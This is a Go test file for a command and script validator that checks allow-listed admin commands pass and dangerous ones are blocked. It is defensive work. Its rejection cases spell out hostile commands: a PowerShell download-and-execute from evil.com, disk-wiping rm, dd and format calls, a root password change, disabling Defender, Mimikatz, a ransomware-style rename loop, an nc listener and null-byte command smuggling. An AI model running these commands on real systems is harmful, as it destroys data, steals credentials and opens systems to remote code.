package executor

import (
	"testing"
)

func TestValidateCommand_ValidCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		wantErr bool
	}{
		{
			name:    "Valid systeminfo",
			command: "systeminfo",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid PowerShell Get-Process",
			command: "Get-Process",
			cmdType: "powershell",
			wantErr: false,
		},
		{
			name:    "Valid ipconfig",
			command: "ipconfig /all",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid ps command",
			command: "ps aux",
			cmdType: "bash",
			wantErr: false,
		},
		{
			name:    "Valid netstat",
			command: "netstat -an",
			cmdType: "cmd",
			wantErr: false,
		},
		{
			name:    "Valid PowerShell with pipe",
			command: "Get-Process | Where-Object {$_.CPU -gt 10}",
			cmdType: "powershell",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_DangerousCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
	}{
		{
			name:    "Dangerous rm -rf /",
			command: "rm -rf /",
			cmdType: "bash",
		},
		{
			name:    "Dangerous format",
			command: "format c:",
			cmdType: "cmd",
		},
		{
			name:    "Dangerous del with /s /q",
			command: "del /s /q c:\\",
			cmdType: "cmd",
		},
		{
			name:    "Dangerous Remove-Item recursive",
			command: "Remove-Item C:\\ -Recurse -Force",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous Set-ExecutionPolicy",
			command: "Set-ExecutionPolicy Unrestricted",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous Invoke-Expression with download",
			command: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",
			cmdType: "powershell",
		},
		{
			name:    "Dangerous useradd",
			command: "useradd hacker",
			cmdType: "bash",
		},
		{
			name:    "Dangerous passwd change",
			command: "echo 'password' | passwd root",
			cmdType: "bash",
		},
		{
			name:    "Dangerous fdisk",
			command: "fdisk /dev/sda",
			cmdType: "bash",
		},
		{
			name:    "Dangerous dd",
			command: "dd if=/dev/zero of=/dev/sda",
			cmdType: "bash",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.cmdType)
			if err == nil {
				t.Errorf("ValidateCommand() expected error for dangerous command: %s", tt.command)
			}
		})
	}
}

func TestValidateCommand_CommandLength(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "Command within length limit",
			command: "systeminfo",
			wantErr: false,
		},
		{
			name:    "Command exceeds length limit",
			command: string(make([]byte, MaxCommandLength+1)),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, "cmd")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateCommand_EmptyCommand(t *testing.T) {
	err := ValidateCommand("", "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for empty command")
	}

	err = ValidateCommand("   ", "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for whitespace-only command")
	}
}

func TestValidateCommand_NullBytes(t *testing.T) {
	command := "systeminfo\x00 && echo hacked"
	err := ValidateCommand(command, "cmd")
	if err == nil {
		t.Error("ValidateCommand() expected error for command with null bytes")
	}
}

func TestValidateCommand_InvalidType(t *testing.T) {
	err := ValidateCommand("systeminfo", "invalid_type")
	if err == nil {
		t.Error("ValidateCommand() expected error for invalid command type")
	}
}

func TestValidateCommand_NotWhitelisted(t *testing.T) {
	// Test commands not in whitelist
	tests := []string{
		"arbitrary_command",
		"malware.exe",
		"nc -l -p 4444",
	}

	for _, cmd := range tests {
		err := ValidateCommand(cmd, "cmd")
		if err == nil {
			t.Errorf("ValidateCommand() expected error for non-whitelisted command: %s", cmd)
		}
	}
}

func TestValidateScript_ValidScripts(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "Valid PowerShell script",
			script:   "Get-Process | Where-Object {$_.CPU -gt 10}",
			language: "powershell",
			wantErr:  false,
		},
		{
			name:     "Valid bash script",
			script:   "#!/bin/bash\necho 'Hello World'",
			language: "bash",
			wantErr:  false,
		},
		{
			name:     "Valid Python script",
			script:   "print('Hello World')",
			language: "python",
			wantErr:  false,
		},
		{
			name:     "Valid batch script",
			script:   "@echo off\necho Hello World",
			language: "bat",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScript() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateScript_DangerousScripts(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
	}{
		{
			name:     "Dangerous ransomware pattern",
			script:   "Get-ChildItem -Recurse | ForEach-Object { Rename-Item $_.FullName ($_.FullName + '.encrypt') }",
			language: "powershell",
		},
		{
			name:     "Dangerous Remove-Item recursive",
			script:   "Remove-Item C:\\Users -Recurse -Force",
			language: "powershell",
		},
		{
			name:     "Dangerous del command",
			script:   "del /s /q C:\\*",
			language: "bat",
		},
		{
			name:     "Dangerous disable defender",
			script:   "Set-MpPreference -DisableRealtimeMonitoring $true",
			language: "powershell",
		},
		{
			name:     "Dangerous format command",
			script:   "format c: /q /y",
			language: "cmd",
		},
		{
			name:     "Dangerous mimikatz reference",
			script:   "Invoke-Mimikatz -Command privilege::debug",
			language: "powershell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if err == nil {
				t.Errorf("ValidateScript() expected error for dangerous script: %s", tt.script)
			}
		})
	}
}

func TestValidateScript_ScriptSize(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "Script within size limit",
			script:   "echo 'test'",
			language: "bash",
			wantErr:  false,
		},
		{
			name:     "Script exceeds size limit",
			script:   string(make([]byte, MaxScriptSize+1)),
			language: "bash",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScript() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateScript_InvalidLanguage(t *testing.T) {
	err := ValidateScript("echo 'test'", "invalid_language")
	if err == nil {
		t.Error("ValidateScript() expected error for invalid language")
	}
}

func TestValidateScript_EmptyScript(t *testing.T) {
	err := ValidateScript("", "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for empty script")
	}

	err = ValidateScript("   ", "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for whitespace-only script")
	}
}

func TestValidateScript_NullBytes(t *testing.T) {
	script := "echo 'test'\x00 && echo 'hacked'"
	err := ValidateScript(script, "bash")
	if err == nil {
		t.Error("ValidateScript() expected error for script with null bytes")
	}
}

func TestExtractBaseCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		cmdType string
		want    string
	}{
		{
			name:    "Simple command",
			command: "systeminfo",
			cmdType: "cmd",
			want:    "systeminfo",
		},
		{
			name:    "Command with arguments",
			command: "ipconfig /all",
			cmdType: "cmd",
			want:    "ipconfig",
		},
		{
			name:    "PowerShell cmdlet",
			command: "Get-Process -Name chrome",
			cmdType: "powershell",
			want:    "Get-Process",
		},
		{
			name:    "Command with pipe",
			command: "ps aux | grep chrome",
			cmdType: "bash",
			want:    "ps",
		},
		{
			name:    "Command with sudo",
			command: "sudo systemctl status",
			cmdType: "bash",
			want:    "systemctl",
		},
		{
			name:    "Command with path",
			command: "/usr/bin/ps aux",
			cmdType: "bash",
			want:    "ps",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractBaseCommand(tt.command, tt.cmdType)
			if got != tt.want {
				t.Errorf("extractBaseCommand() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestSanitizeArguments(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "Normal command",
			command: "systeminfo",
			wantErr: false,
		},
		{
			name:    "Command with reasonable special chars",
			command: "ps aux | grep test",
			wantErr: false,
		},
		{
			name:    "Command with excessive special chars",
			command: "cmd | | | | | | | | | | | cmd",
			wantErr: true,
		},
		{
			name:    "Command with BiDi override",
			command: "test\u202Ecmd",
			wantErr: true,
		},
		{
			name:    "Command with non-printable chars",
			command: "test\x01cmd",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sanitizeArguments(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("sanitizeArguments() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
